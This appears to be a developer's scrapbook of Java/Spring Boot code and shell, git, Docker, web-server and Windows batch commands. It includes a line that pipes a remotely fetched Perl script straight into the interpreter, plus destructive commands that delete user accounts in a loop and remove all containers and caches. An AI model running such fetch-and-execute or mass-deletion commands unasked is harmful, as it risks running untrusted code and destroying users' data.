Map<String, Object> hookMap = JsonUtils.parse(hook, Map.class);

public <T> Page<T> getPage(int current, int size, String sort, String order){
    Page<T> page = new Page<T>(current, size, sort);
    if ("desc".equals(order)) {
        page.setAsc(false);
    } else {
        page.setAsc(true);
    }
    return page;
}
--------------------------------------------------------------------------------------------------------
public class FileSizeExample 
{
    public static void main(String[] args)
    {	
		File file =new File("c:\\java_xml_logo.jpg");
		
		if(file.exists()){
			
			double bytes = file.length();
			double kilobytes = (bytes / 1024);
			double megabytes = (kilobytes / 1024);
			double gigabytes = (megabytes / 1024);
			double terabytes = (gigabytes / 1024);
			double petabytes = (terabytes / 1024);
			double exabytes = (petabytes / 1024);
			double zettabytes = (exabytes / 1024);
			double yottabytes = (zettabytes / 1024);
			
			System.out.println("bytes : " + bytes);
			System.out.println("kilobytes : " + kilobytes);
			System.out.println("megabytes : " + megabytes);
			System.out.println("gigabytes : " + gigabytes);
			System.out.println("terabytes : " + terabytes);
			System.out.println("petabytes : " + petabytes);
			System.out.println("exabytes : " + exabytes);
			System.out.println("zettabytes : " + zettabytes);
			System.out.println("yottabytes : " + yottabytes);
		}else{
			 System.out.println("File does not exists!");
		}
    		
    }
}
--------------------------------------------------------------------------------------------------------
//    private StreamingResponseBody toStreaming(final InputStream command) {
//        return outputStream -> {
//            final Observable<InputStream> stream = command.toObservable();
//            stream.toBlocking().subscribe(inputStream -> {
//                try {
//                    IOUtils.copyLarge(inputStream, outputStream);
//                    outputStream.flush();
//                } catch (IOException e) {
//                    try {
//                        inputStream.close();
//                    } catch (IOException closingException) {
//                        log.warn("could not close command result, a http connection may be leaked !", closingException);
//                    }
//                    log.error("Unable to fully copy command result '{}'.", command.getClass(), e);
//                }
//            }, TDPException::rethrowOrWrap);
//        };
//    }
--------------------------------------------------------------------------------------------------------
public class ClassValidationMvcTest {
  private MockMvc mockMvc;
     
    @Before
    public void setup(){
        this.mockMvc = MockMvcBuilders
          .standaloneSetup(new NewUserController()).build();
    }
     
    @Test
    public void givenMatchingEmailPassword_whenPostNewUserForm_thenOk() 
      throws Exception {
        this.mockMvc.perform(MockMvcRequestBuilders
          .post("/user")
          .accept(MediaType.TEXT_HTML).
          .param("email", "john@yahoo.com")
          .param("verifyEmail", "john@yahoo.com")
          .param("password", "pass")
          .param("verifyPassword", "pass"))
          .andExpect(model().errorCount(0))
          .andExpect(status().isOk());
    }
}
--------------------------------------------------------------------------------------------------------
@GetMapping(value = "/image", produces = "image/png")
public ResponseEntity<StreamingResponseBody> image() {
    BufferedImage canvas = service.createImage();

    StreamingResponseBody stream = outputStream ->
            ImageIO.write(canvas, "png", outputStream);

    return ResponseEntity.ok()
        .contentType(MediaType.IMAGE_PNG)
        .body(stream);
}


https://auth0.com/blog/automatically-mapping-dto-to-entity-on-spring-boot-apis/

@DateTimeFormat(iso = DateTimeFormat.ISO.DATE)
@JsonFormat(pattern = "MM/dd/yyyy")
private LocalDate startDate;

@JsonDeserialize(using = DateDeSerializer .class)
 private Date startDate;
 
 public class DateDeSerializer extends StdDeserializer<Date> {

    public DateDeSerializer() {
        super(Date.class);
    }

    @Override
    public Date deserialize(JsonParser p, DeserializationContext ctxt)
        throws IOException, JsonProcessingException {
        String value = p.readValueAs(String.class);
        try {
            return new SimpleDateFormat("MM/dd/yyyy").parse(value);
        } catch (DateTimeParseException e) {
            //throw an error
        }
    }

}
--------------------------------------------------------------------------------------------------------
spring.jpa.properties.javax.persistence.schema-generation.create-source=metadata
spring.jpa.properties.javax.persistence.schema-generation.scripts.action=create
spring.jpa.properties.javax.persistence.schema-generation.scripts.create-target=create.sql
--------------------------------------------------------------------------------------------------------
        try (ObjectOutputStream oos = new ObjectOutputStream(new GZIPOutputStream(outputStream))) {
            oos.writeObject(result);
        }
--------------------------------------------------------------------------------------------------------
uuidgen | grep -E "[A-F0-9]{8}-[A-F0-9]{4}-4[A-F0-9]{3}-[89AB][A-F0-9]{3}-[A-F0-9]{12}"
/[a-f0-9]{8}-[a-f0-9]{4}-4[a-f0-9]{3}-[89aAbB][a-f0-9]{3}-[a-f0-9]{12}/

@GetMapping("/file/{id:[a-f0-9]{64}}/{key:[a-f0-9]{64}}")

UUID v1 :

/^[0-9A-F]{8}-[0-9A-F]{4}-[1][0-9A-F]{3}-[89AB][0-9A-F]{3}-[0-9A-F]{12}$/i
UUID v2 :

/^[0-9A-F]{8}-[0-9A-F]{4}-[2][0-9A-F]{3}-[89AB][0-9A-F]{3}-[0-9A-F]{12}$/i
UUID v3 :

/^[0-9A-F]{8}-[0-9A-F]{4}-[3][0-9A-F]{3}-[89AB][0-9A-F]{3}-[0-9A-F]{12}$/i
UUID v4 :

/^[0-9A-F]{8}-[0-9A-F]{4}-[4][0-9A-F]{3}-[89AB][0-9A-F]{3}-[0-9A-F]{12}$/i
UUID v5 :

/^[0-9A-F]{8}-[0-9A-F]{4}-[5][0-9A-F]{3}-[89AB][0-9A-F]{3}-[0-9A-F]{12}$/i
--------------------------------------------------------------------------------------------------------
@RequestMapping(path = "config", method = RequestMethod.GET)
public ResponseEntity<StreamingResponseBody> getConfig() {
    HttpHeaders headers = new HttpHeaders();
    // 'produces' in annotation does not work with stream
    headers.setContentType(MediaType.APPLICATION_JSON);
    headers.set(HttpHeaders.CONTENT_DISPOSITION, "attachment; filename=\"cluman_config.json\"");
    return new ResponseEntity<>((os) -> {
        appConfigService.write(MimeTypeUtils.APPLICATION_JSON_VALUE, os);
    }, headers, HttpStatus.OK);
}
--------------------------------------------------------------------------------------------------------
@PostMapping("/")
@ResponseBody
ResponseEntity<StreamingResponseBody> post(@RequestPart final MultipartFile file)
        throws Exception {

    if (file.isEmpty()) {
        throw new ValidationException("file was empty");
    }

    final HttpHeaders headers = new HttpHeaders();
    headers.setContentDispositionFormData("filename", "sample.txt");

    final StreamingResponseBody body = out -> out.write(file.getBytes());

    return ResponseEntity.ok()
            .headers(headers)
            .contentType(MediaType.valueOf("application/force-download"))
            .body(body);
}
--------------------------------------------------------------------------------------------------------
package com.paragon.microservices.distributor.controller.impl;

import com.paragon.mailingcontour.commons.configuration.BaseExceptionHandler;
import lombok.RequiredArgsConstructor;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.boot.web.servlet.error.ErrorAttributes;
import org.springframework.boot.web.servlet.error.ErrorController;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.context.request.WebRequest;

import javax.servlet.http.HttpServletResponse;
import java.util.HashMap;
import java.util.Map;

@Controller
@RequiredArgsConstructor
public class BaseErrorController implements ErrorController {
    private final ErrorAttributes errorAttributes;

    @Value("${server.error.path:${error.path:/error}}")
    private String path;

    @RequestMapping("${server.error.path:${error.path:/error}}")
    @ResponseBody
    public ResponseEntity<BaseExceptionHandler.ExceptionResponse> handleError(final WebRequest request, final HttpServletResponse response) {
        final Map<String, Object> errorAttributes = this.getErrorAttributes(request);
        return BaseExceptionHandler.buildResponse(String.valueOf(errorAttributes.get("path")), String.valueOf(errorAttributes.get("message")), HttpStatus.valueOf(response.getStatus()));
    }

    @Override
    public String getErrorPath() {
        return this.path;
    }

    private Map<String, Object> getErrorAttributes(final WebRequest request) {
        final Map<String, Object> errorMap = new HashMap<>();
        errorMap.putAll(this.errorAttributes.getErrorAttributes(request, false));
        return errorMap;
    }
}
--------------------------------------------------------------------------------------------------------
public class ExceptionResponse {

  private Integer status;
  private String path;
  private String errorMessage;
  private String timeStamp;
  private String trace;

  public ExceptionResponse(int status, Map<String, Object> errorAttributes) {
    this.setStatus(status);
    this.setPath((String) errorAttributes.get("path"));
    this.setErrorMessage((String) errorAttributes.get("message"));
    this.setTimeStamp(errorAttributes.get("timestamp").toString());
    this.setTrace((String) errorAttributes.get("trace"));
  }

  public Integer getStatus() {
    return status;
  }

  private void setStatus(Integer status) {
    this.status = status;
  }

  public String getErrorMessage() {
    return errorMessage;
  }

  private void setErrorMessage(String errorMessage) {
    this.errorMessage = errorMessage;
  }

  public String getTimeStamp() {
    return timeStamp;
  }

  private void setTimeStamp(String timeStamp) {
    this.timeStamp = timeStamp;
  }

  public String getTrace() {
    return trace;
  }

  private void setTrace(String trace) {
    this.trace = trace;
  }

  public String getPath() {
    return path;
  }

  private void setPath(String path) {
    this.path = path;
  }
}
--------------------------------------------------------------------------------------------------------
@FeignClient(name = "currency-exchange")
@RibbonClient(name = "currency-exchange")
public interface CurrencyExchangeProxy {

    @GetMapping("/exchange/{from}/to/{to}")
    PairRateDto callForExchangeValue(@PathVariable("from") String fromValue, @PathVariable("to") String toValue);

}

@RestController
public class WebController {
private static final String template = "Hello, %s!";
    private final AtomicLong counter = new AtomicLong();

    @RequestMapping(value= "/hi", method = RequestMethod.GET)
    public @ResponseBody Greeting sayHello(
            @RequestParam(value = "name", required = false, defaultValue = "Stranger") String name) {
        System.out.println("Inside sayHello() of WebController.java");
        return new Greeting(counter.incrementAndGet(), String.format(template, name));
    }
}
--------------------------------------------------------------------------------------------------------
 this.mockMvc.perform(get("/test"))
                .andExpect(content().contentType(MediaType.APPLICATION_JSON_UTF8_VALUE))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$.value", is("Hello!")));

--------------------------------------------------------------------------------------------------------
grep --basic-regexp "^.\{1,35\}$"
echo "Hello" | grep --extended-regexp "^.{1,35}$"
--------------------------------------------------------------------------------------------------------
timedatectl set-ntp true
cfdisk

mkfs.ext4 /dev/sda1
mkfs.ext4 /dev/sda2

mount /dev/sda2 /mnt
mkidr /mnt/boot
mount /dev/sda1 /mnt/boot

pacstrap /mnt base

genfstab -U /mnt >> /mnt/etc/fstab
arch-chroot /mnt

ln -sf /usr/share/zoneinfo/America/New_York /etc/localtime

hwclock --systohc

locale-gen
vi /etc/locale.conf
LANG=en_US.UTF-8

systemctl enable dhcpcd
useradd -m -G users,audio,input,optical,storage,video -s /bin/bash username

mkinitcpio -p linux
pacman -S grub
grub-install --target=i386-pc /dev/sda
grub-mkconfig -o /boot/grub/grub.cfg

exit
umount -R /mnt
reboot
--------------------------------------------------------------------------------------------------------
var paragraphs = document.getElementsByTagName("p");
for (var i = 0; i < paragraphs.length; i++) {
  var paragraph = paragraphs.item(i);
  paragraph.style.setProperty("color", "blue", null);
}

d3.selectAll("p").style("color", "blue");
--------------------------------------------------------------------------------------------------------
@Pattern(regexp="[a-z0-9!#$%&'*+/=?^_`{|}~-]+(?:\\.[a-z0-9!#$%&'*+/=?^_`{|}~-]+)*@(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\\.)+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?", message="Invalid email")//if the field contains email address consider using this annotation to enforce field validation
--------------------------------------------------------------------------------------------------------
Install-Package Umbraco.Iconator
--------------------------------------------------------------------------------------------------------
sudo do-release-upgrade -d
sudo do-release-upgrade

sudo apt install update-manager-core
sudo apt update && sudo apt upgrade

sudo nano /etc/update-manager/release-upgrades
Change Prompt=lts to Prompt=normal. Press Ctrl + X, then y followed by Enter to save the file.

sudo systemctl reboot
sudo reboot
--------------------------------------------------------------------------------------------------------
conda install -c quantnet qnt
conda install package-name=2.3.4
conda install /package-path/package-filename.tar.bz2
conda install /packages-path/packages-filename.tar
--------------------------------------------------------------------------------------------------------
<html>
  <svg
    width="5cm"
    height="4cm"
    version="1.1"
    xmlns="http://www.w3.org/2000/svg"
    xmlns:xlink="http://www.w3.org/1999/xlink"
  >
    <path d="M 0 0 L 100 0 L 100 100 L 0 50 Z" />
  </svg>
</html>
--------------------------------------------------------------------------------------------------------
@echo off

:: Connecting to VPN...
rasdial "VPN Name" user pass

echo Running RDP...
"Connect to Server.rdp"

echo Finished - disconnecting from VPN...
rasdial "VPN Name" /disconnect
--------------------------------------------------------------------------------------------------------
systemctl enable myunit
systemctl -l status myunit
systemctl start myunit
systemctl daemon-reload
--------------------------------------------------------------------------------------------------------
git -c diff.mnemonicprefix=false -c core.quotepath=false --no-optional-locks stash save version_01
git -c diff.mnemonicprefix=false -c core.quotepath=false --no-optional-locks stash apply stash@{0}

git -c diff.mnemonicprefix=false -c core.quotepath=false --no-optional-locks fetch origin
git -c diff.mnemonicprefix=false -c core.quotepath=false --no-optional-locks pull --no-commit origin master
--------------------------------------------------------------------------------------------------------
spring init --name=scheduler-demo scheduler-demo 
--------------------------------------------------------------------------------------------------------
git config merge.tool vimdiff
git config merge.conflictstyle diff3
git config mergetool.prompt false
--------------------------------------------------------------------------------------------------------
git branch -D PDWB-527_kafka_refactoring
--------------------------------------------------------------------------------------------------------
docker run -d --name axonserver -p 8024:8024 -p 8124:8124 axoniq/axonserver
--------------------------------------------------------------------------------------------------------
$ bin/kafka-topics.sh --create \
  --zookeeper localhost:2181 \
  --replication-factor 1 --partitions 1 \
  --topic mytopic
--------------------------------------------------------------------------------------------------------
$ bin/kafka-topics.sh --create --zookeeper localhost:2181 --replication-factor 1 --partitions 1 --topic baeldung
$ bin/kafka-topics.sh --create --zookeeper localhost:2181 --replication-factor 1 --partitions 5 --topic partitioned
$ bin/kafka-topics.sh --create --zookeeper localhost:2181 --replication-factor 1 --partitions 1 --topic filtered
$ bin/kafka-topics.sh --create --zookeeper localhost:2181 --replication-factor 1 --partitions 1 --topic greeting
--------------------------------------------------------------------------------------------------------
docker run -e "JAVA_OPTS=-agentlib:jdwp=transport=dt_socket,address=5005,server=y,suspend=n" -p 8080:8080 -p 5005:5005 -t springio/gs-spring-boot-docker
--------------------------------------------------------------------------------------------------------
% pgpk -a KEYS
% pgpv apache-ant-1.10.5-bin.tar.gz.asc
or
% pgp -ka KEYS
% pgp apache-ant-1.10.5-bin.tar.gz.asc
or
% gpg --import KEYS
% gpg --verify apache-ant-1.10.5-bin.tar.gz.asc
--------------------------------------------------------------------------------------------------------
postcss --use autoprefixer -c options.json -o main.css css/*.css
--------------------------------------------------------------------------------------------------------
find ~/.IntelliJIdea* -type d -exec touch -t $(date +"%Y%m%d%H%M") {} ;
--------------------------------------------------------------------------------------------------------
sudo service rsyslog restart
--------------------------------------------------------------------------------------------------------
git remote set-url origin <url>
--------------------------------------------------------------------------------------------------------
git fetch origin
git checkout -b mailer_redis origin/mailer_redis

git fetch origin
git checkout origin/master
git merge --no-ff mailer_redis

git push origin master

git push --set-upstream origin master_redis
--------------------------------------------------------------------------------------------------------
postcss --use autoprefixer -c options.json -o main.css css/*.css
--------------------------------------------------------------------------------------------------------
 scoop bucket add extras
 scoop install alacritty
 
 gem install mustache
--------------------------------------------------------------------------------------------------------
@echo off
rem For each file in your folder
for %%a in (".\*") do (
rem check if the file has an extension and if it is not our script
if "%%~xa" NEQ "" if "%%~dpxa" NEQ "%~dpx0" (
rem check if extension folder exists, if not it is created
if not exist "%%~xa" mkdir "%%~xa"
rem Move the file to directory
move "%%a" "%%~dpa%%~xa\"
))
--------------------------------------------------------------------------------------------------------
docker stop $(docker ps -a -q)
docker rm $(docker ps -a -q)
--------------------------------------------------------------------------------------------------------
git log --graph --pretty=format:'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)<%an>%Creset' --abbrev-commit
git config --global alias.lg "log --color --graph --pretty=format:'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)<%an>%Creset' --abbrev-commit"
git lg
git lg -p
--------------------------------------------------------------------------------------------------------
find . -maxdepth 1 -type d \( ! -name . \) -exec bash -c "cd '{}' && pwd" \;
find . -name .git -type d -execdir git pull -v ';
For /R %%G in (*.LOG) do Echo REN "%%G" "%%~nG.TXT"
For /R C:\temp\ %%G IN (*.bak) do Echo del "%%G"

for /f "delims=" %i in ('dir /ad/s/b') do cacls "%i" >>"%TEMP%\cacls.log"
for /F %i in ('dir /b *.log') do notepad %i
for %i in (user1 user2 user3 user4 user5 user6) do net user /delete %i
for /F %i in (filename) do net user /delete %i

for %i in (set) do command command-arguments

for /F "tokens=2,4 delims=," %i in (test.txt) do @echo %i %j
for /F "tokens=2,4 delims=," %i in (test.txt) do @echo %i,%j
for /F "tokens=2,4" %i in (test.txt) do @echo %i %j

mstsc /console
mstsc /f
mstsc /v:computername
mstsc RDP_filename

start "" http://www.cnn.com
--------------------------------------------------------------------------------------------------------
powercfg/energy

CALL:ECHORED "Print me in red!"
:ECHORED
%Windir%\System32\WindowsPowerShell\v1.0\Powershell.exe write-host -foregroundcolor Red %1
goto:eof
--------------------------------------------------------------------------------------------------------
An alternative command to list folders and sub folders matching a wildcard is DIR:
C:\> dir /b /s /a:d "C:\Work\reports*"

To loop through each folder programatically, we can wrap that in a FOR /F command: 
C:\> for /f "tokens=*" %G in ('dir /b /s /a:d "C:\Work\reports*"') do echo Found %G

or the same thing in a batch file, with the %'s doubled: 
for /f "tokens=*" %%G in ('dir /b /s /a:d "C:\Work\reports*"') do echo Found %%G
--------------------------------------------------------------------------------------------------------
find . -type f -regex ".*/build/test-results/.*xml" -exec cp {} $CIRCLE_TEST_REPORTS/junit/ \;
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
git fetch --unshallow || true
git fetch --tags
--------------------------------------------------------------------------------------------------------
git reset --hard @{u}
git branch -a; git tag, git log --all or, my preference, you can look graphically at gitk --all --date-order
git reset --hard REF
git reset --hard HEAD^

git branch nonce $last
git rebase -p --onto $destination $first^ nonce

git checkout $destination
git reset --hard nonce
git branch -d nonce


gitk --all --date-order
git rebase -p --onto $first^ $last $source
git rebase -p --onto SHA^ SHA

https://sethrobertson.github.io/GitFixUm/fixup.html

bfg --strip-blobs-bigger-than 100M --replace-text banned.txt repo.git

git clone --mirror git://example.com/some-big-repo.git
java -jar bfg.jar --strip-blobs-bigger-than 100M some-big-repo.git
$ cd some-big-repo.git
$ git reflog expire --expire=now --all && git gc --prune=now --aggressive
git push

$ bfg --delete-files id_{dsa,rsa}  my-repo.git
$ bfg --strip-blobs-bigger-than 50M  my-repo.git
$ bfg --replace-text passwords.txt  my-repo.git
$ bfg --delete-folders .git --delete-files .git  --no-blob-protection  my-repo.git
$ bfg --strip-biggest-blobs 100 --protect-blobs-from master,maint,next repo.git
--------------------------------------------------------------------------------------------------------
gem install asciidoctor
--------------------------------------------------------------------------------------------------------
docker run -d --name postgres -p 5432:5432 -e POSTGRES_USER=reactive -e POSTGRES_PASSWORD=reactive123 -e POSTGRES_DB=reactive postgres
--------------------------------------------------------------------------------------------------------
$ curl -d '{"name":"Test1"}' -H "Content-Type: application/json" -X POST http://localhost:8095/organizations
$ curl -d '{"name":"Name1", "balance":5000, "organizationId":1}' -H "Content-Type: application/json" -X POST http://localhost:8090/employees
$ curl -d '{"name":"Name2", "balance":10000, "organizationId":1}' -H "Content-Type: application/json" -X POST http://localhost:8090/employees
--------------------------------------------------------------------------------------------------------
$ rm -rf ~/Library/Caches/IntelliJIdea15
$ rm -rf ~/Library/Preferences/IntelliJIdea15
--------------------------------------------------------------------------------------------------------
curl -I https://yourzone-1c6b.kxcdn.com/assets/css/style.css
--------------------------------------------------------------------------------------------------------
Dism /Split-Image /ImageFile:J:\sources\install.wim /SWMFile:H:\CustomInstall\install.swm /FileSize:1000
--------------------------------------------------------------------------------------------------------
readelf -s file
--------------------------------------------------------------------------------------------------------
cd ~/.ssh
ssh-keygen -o
ssh-add /path/to/your/private.key
cat id_rsa.pub
--------------------------------------------------------------------------------------------------------
systemctl start nginx

service nginx stop
systemctl stop nginx

killall -9 nginx

service nginx reload
systemctl reload nginx

nginx -t

service nginx -v
systemctl -v nginx
--------------------------------------------------------------------------------------------------------
.htaccess#
<IfModule mod_headers.c>
    <FilesMatch "\.(ttf|ttc|otf|eot|woff|font.css|css|js|gif|png|jpe?g|svg|svgz|ico|webp)$">
        Header set Access-Control-Allow-Origin "*"
    </FilesMatch>
</IfModule>
Nginx#
location ~ \.(ttf|ttc|otf|eot|woff|font.css|css|js|gif|png|jpe?g|svg|svgz|ico|webp)$ {
    add_header Access-Control-Allow-Origin "*";
}
--------------------------------------------------------------------------------------------------------
httpd -V
apache2 -M
httpd -M

authn_alias_module
authn_anon_module
authn_dbm_module
authn_default_module
authz_dbm_module
authz_default_module
authnz_ldap_module
cache_module
cgi_module
disk_cache_module
include_module
ldap_module
proxy_balancer_module
proxy_ftp_module
proxy_http_module
proxy_ajp_module
proxy_connect_module
suexec_module
version_module

server {
    server_name origin.example.com;
    listen 80;

    root /var/www/example;
    index index.php index.html index.htm;

    set $cache_path $request_uri;

    # bypass cache for POST requests
    if ($request_method = POST) {
        set $cache_path 'nocache';
    }

    # don't cache login/admin URLs
    if ($request_uri ~* "/(wp-login.php|wp-admin|login.php|backend|admin)") {
        set $cache_path 'nocache';
    }

    # don't cache if there is a cookie called PHPSESSID
    if ($http_cookie ~* "PHPSESSID") {
        set $cache_path 'nocache';
    }

    # bypass cache for logged in users
    if ($http_cookie ~ (wp-postpass|wordpress_|comment_author)_) {
        set $cache_path 'nocache';
    }

    # bypass cache if query string not empty
    if ($query_string) {
        set $cache_path 'nocache';
    }

    location / {
        # this line is specific to Cache Enabler
        try_files /wp-content/cache/cache-enabler/${http_host}${cache_path}index.html $uri $uri/ /index.php?$args;

        if ($cache_path = 'nocache') {
            expires -1;
            add_header Cache-Control no-cache;
        }
    }

    # php7 fastcgi
    location ~ \.php$ {
        fastcgi_split_path_info ^(.+\.php)(/.+)$;
        fastcgi_pass unix:/run/php/php7.0-fpm.sock;
        fastcgi_index index.php;
        include fastcgi_params;
        ...

        fastcgi_intercept_errors on;

        if ($cache_path = 'nocache') {
            expires -1;
            add_header Cache-Control no-cache;
        }
        if ($cache_path != 'nocache') {
            expires +1h;
        }
    }

    # static assets
    location ~* \.(js|css|png|jpg|jpeg|gif|ico)$ {
        log_not_found off;

        add_header Cache-Control "max-age=604800, stale-while-revalidate=86400, stale-if-error=604800";
    }
}
--------------------------------------------------------------------------------------------------------
curl -sL https://raw.githubusercontent.com/richardforth/apache2buddy/master/apache2buddy.pl | perl
--------------------------------------------------------------------------------------------------------
grep processor /proc/cpuinfo | wc -l
--------------------------------------------------------------------------------------------------------
npm install -g caniuse-cmd
caniuse preload

npm install uglify-js -g
uglifyjs jquery-3.2.1.js --output jquery-3.2.1.min.js

uglifyjs jquery-3.2.1.js --compress --mangle --output jquery-3.2.1.min.js

glifyjs jquery-3.2.1.js --compress sequences=true,conditionals=true,booleans=true --mangle --output jquery-3.2.1.min.js
--------------------------------------------------------------------------------------------------------
sudo apt install kodi
sudo apt install software-properties-common
sudo add-apt-repository ppa:team-xbmc/ppa
sudo apt update
sudo apt install kodi

sudo apt update
sudo apt install kodi

sudo dnf install https://download1.rpmfusion.org/free/fedora/rpmfusion-free-release-$(rpm -E %fedora).noarch.rpm https://download1.rpmfusion.org/nonfree/fedora/rpmfusion-nonfree-release-$(rpm -E %fedora).noarch.rpm
sudo gedit /etc/selinux/config
sudo dnf install kodi

pacman -Syu
pacman -S kodi
--------------------------------------------------------------------------------------------------------
Manifest-Version: 1.0
Export-Package: com.netflix.hystrix;version="1.5.12";uses:="com.netfli
 x.hystrix.collapser,com.netflix.hystrix.metric,com.netflix.hystrix.st
 rategy.concurrency,com.netflix.hystrix.strategy.properties,com.netfli
 x.hystrix.util,rx,rx.functions",com.netflix.hystrix.collapser;version
 ="1.5.12";uses:="com.netflix.hystrix,com.netflix.hystrix.strategy.con
 currency,com.netflix.hystrix.util,rx",com.netflix.hystrix.config;vers
 ion="1.5.12";uses:="com.netflix.hystrix,rx",com.netflix.hystrix.excep
 tion;version="1.5.12";uses:="com.netflix.hystrix",com.netflix.hystrix
 .metric;version="1.5.12";uses:="com.netflix.hystrix,com.netflix.hystr
 ix.strategy.concurrency,org.HdrHistogram,rx,rx.functions",com.netflix
 .hystrix.metric.consumer;version="1.5.12";uses:="com.netflix.hystrix,
 com.netflix.hystrix.metric,org.HdrHistogram,rx,rx.functions",com.netf
 lix.hystrix.metric.sample;version="1.5.12";uses:="com.netflix.hystrix
 ,rx",com.netflix.hystrix.strategy;version="1.5.12";uses:="com.netflix
 .hystrix.strategy.concurrency,com.netflix.hystrix.strategy.eventnotif
 ier,com.netflix.hystrix.strategy.executionhook,com.netflix.hystrix.st
 rategy.metrics,com.netflix.hystrix.strategy.properties",com.netflix.h
 ystrix.strategy.concurrency;version="1.5.12";uses:="com.netflix.hystr
 ix,com.netflix.hystrix.strategy.properties,rx,rx.functions",com.netfl
 ix.hystrix.strategy.eventnotifier;version="1.5.12";uses:="com.netflix
 .hystrix",com.netflix.hystrix.strategy.executionhook;version="1.5.12"
 ;uses:="com.netflix.hystrix,com.netflix.hystrix.exception",com.netfli
 x.hystrix.strategy.metrics;version="1.5.12";uses:="com.netflix.hystri
 x",com.netflix.hystrix.strategy.properties;version="1.5.12";uses:="co
 m.netflix.config,com.netflix.hystrix",com.netflix.hystrix.strategy.pr
 operties.archaius;version="1.5.12";uses:="com.netflix.hystrix.strateg
 y.properties",com.netflix.hystrix.util;version="1.5.12";uses:="com.ne
 tflix.hystrix,com.netflix.hystrix.strategy.properties"
Implementation-Title: com.netflix.hystrix#hystrix-core;1.5.12
Change: a7b66ca
Built-By: jenkins
Tool: Bnd-3.2.0.201605172007
Gradle-Version: 3.1
Built-OS: Linux
Build-Host: https://netflixoss.ci.cloudbees.com/
Require-Capability: osgi.ee;filter:="(&(osgi.ee=JavaSE)(version=1.6))"
Module-Source: /hystrix-core
Build-Number: 72
Module-Origin: git@github.com:Netflix/Hystrix.git
Bundle-SymbolicName: com.netflix.hystrix.core
Build-Id: 72
Eclipse-ExtensibleAPI: true
X-Compile-Target-JDK: 1.6
Implementation-Version: 1.5.12
Module-Owner: netflixoss@netflix.com
Bundle-Name: hystrix-core
Created-By: 1.7.0_79-b15 (Oracle Corporation)
Build-Job: NetflixOSS/Hystrix/Hystrix-release
Build-Date: 2017-05-16_16:00:19
X-Compile-Source-JDK: 1.6
Build-Java-Version: 1.7.0_79
Bundle-Vendor: Netflix
Built-Status: integration
Bundle-Version: 1.5.12
Branch: master
Bnd-LastModified: 1494975639000
Bundle-ManifestVersion: 2
Module-Email: netflixoss@netflix.com
Import-Package: com.netflix.config,com.netflix.hystrix;version="[1.5,2
 )",com.netflix.hystrix.collapser;version="[1.5,2)",com.netflix.hystri
 x.exception;version="[1.5,2)",com.netflix.hystrix.metric;version="[1.
 5,2)",com.netflix.hystrix.metric.consumer;version="[1.5,2)",com.netfl
 ix.hystrix.strategy;version="[1.5,2)",com.netflix.hystrix.strategy.co
 ncurrency;version="[1.5,2)",com.netflix.hystrix.strategy.eventnotifie
 r;version="[1.5,2)",com.netflix.hystrix.strategy.executionhook;versio
 n="[1.5,2)",com.netflix.hystrix.strategy.metrics;version="[1.5,2)",co
 m.netflix.hystrix.strategy.properties;version="[1.5,2)",com.netflix.h
 ystrix.util;version="[1.5,2)",org.HdrHistogram;version="[2.1,3)",org.
 slf4j;version="[1.7,2)",rx;version="[1.2,2)",rx.functions;version="[1
 .2,2)",rx.internal.schedulers;version="[1.2,2)",rx.observables;versio
 n="[1.2,2)",rx.observers;version="[1.2,2)",rx.schedulers;version="[1.
 2,2)",rx.subjects;version="[1.2,2)",rx.subscriptions;version="[1.2,2)
 ",sun.misc]
Embed-Dependency: *;scope=compile
Bundle-DocURL: https://github.com/Netflix/Hystrix
--------------------------------------------------------------------------------------------------------
	static {
		WEAVING_MODE = System.getProperty("weavingMode", WeavingMode.RUNTIME.name()).toUpperCase();
	}
--------------------------------------------------------------------------------------------------------
<ehcache xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
	xsi:noNamespaceSchemaLocation="ehcache.xsd" 
	updateCheck="true"
	monitoring="autodetect" 
	dynamicConfig="true">

	<diskStore path="java.io.tmpdir" />
	
	<cache name="movieFindCache" 
		maxEntriesLocalHeap="10000"
		maxEntriesLocalDisk="1000" 
		eternal="false" 
		diskSpoolBufferSizeMB="20"
		timeToIdleSeconds="300" timeToLiveSeconds="600"
		memoryStoreEvictionPolicy="LFU" 
		transactionalMode="off">
		<persistence strategy="localTempSwap" />
	</cache>

</ehcache>

import org.springframework.cache.CacheManager;
import org.springframework.cache.annotation.EnableCaching;
import org.springframework.cache.ehcache.EhCacheCacheManager;
import org.springframework.cache.ehcache.EhCacheManagerFactoryBean;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.ComponentScan;
import org.springframework.context.annotation.Configuration;
import org.springframework.core.io.ClassPathResource;

@Configuration
@EnableCaching
@ComponentScan({ "com.mkyong.*" })
public class AppConfig {

	@Bean
	public CacheManager cacheManager() {
		return new EhCacheCacheManager(ehCacheCacheManager().getObject());
	}

	@Bean
	public EhCacheManagerFactoryBean ehCacheCacheManager() {
		EhCacheManagerFactoryBean cmfb = new EhCacheManagerFactoryBean();
		cmfb.setConfigLocation(new ClassPathResource("ehcache.xml"));
		cmfb.setShared(true);
		return cmfb;
	}
}
--------------------------------------------------------------------------------------------------------
import org.ehcache.event.CacheEvent;
import org.ehcache.event.CacheEventListener;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class CacheEventLogger implements CacheEventListener<Object, Object> {

    private static final Logger log = LoggerFactory.getLogger(CacheEventLogger.class);

    @Override
    public void onEvent(CacheEvent<? extends Object, ? extends Object> cacheEvent) {
        log.info("Cache event {} for item with key {}. Old value = {}, New value = {}", cacheEvent.getType(), cacheEvent.getKey(), cacheEvent.getOldValue(), cacheEvent.getNewValue());
    }
}

spring.cache.jcache.config=classpath:ehcache.xml

<config xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xmlns="http://www.ehcache.org/v3"
    xmlns:jsr107="http://www.ehcache.org/v3/jsr107"
    xsi:schemaLocation="
